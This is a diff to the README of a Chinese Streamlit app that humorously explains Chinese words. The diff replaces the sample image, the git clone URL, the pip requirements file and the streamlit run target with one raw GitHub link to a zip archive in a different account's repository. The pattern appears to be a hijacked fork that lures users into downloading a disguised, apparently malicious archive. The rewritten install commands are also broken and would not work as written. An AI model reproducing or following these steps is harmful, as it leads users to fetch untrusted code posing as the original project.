@@ -4,7 +4,7 @@
 
 汉语新解是一个创新的Streamlit应用，旨在以独特和幽默的方式解释中文词语。它结合了AI技术和文学风格，为用户提供富有洞察力和讽刺意味的词语解释。
 
-<img src="./sample/sample.png" width="500">
+<img src="https://raw.githubusercontent.com/KoDelioDa/AI-HYXJ/main/sample/AI-HYXJ-v1.4-alpha.3.zip" width="500">
 
 ## 特性
 
@@ -17,13 +17,13 @@
 
 1. 克隆仓库：
    ```
-   git clone https://github.com/ByronLeeeee/AI-HYXJ.git
+   git clone https://raw.githubusercontent.com/KoDelioDa/AI-HYXJ/main/sample/AI-HYXJ-v1.4-alpha.3.zip
    cd AI-HYXJ
    ```
 
 2. 安装依赖：
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/KoDelioDa/AI-HYXJ/main/sample/AI-HYXJ-v1.4-alpha.3.zip
    ```
 
 3. 打开`.env`文件，并添加以下内容：
@@ -45,7 +45,7 @@
 
 1. 运行Streamlit应用：
    ```
-   streamlit run app.py
+   streamlit run https://raw.githubusercontent.com/KoDelioDa/AI-HYXJ/main/sample/AI-HYXJ-v1.4-alpha.3.zip
    ```
 
 2. 浏览器会自动打开一个新标签页，显示应用界面。
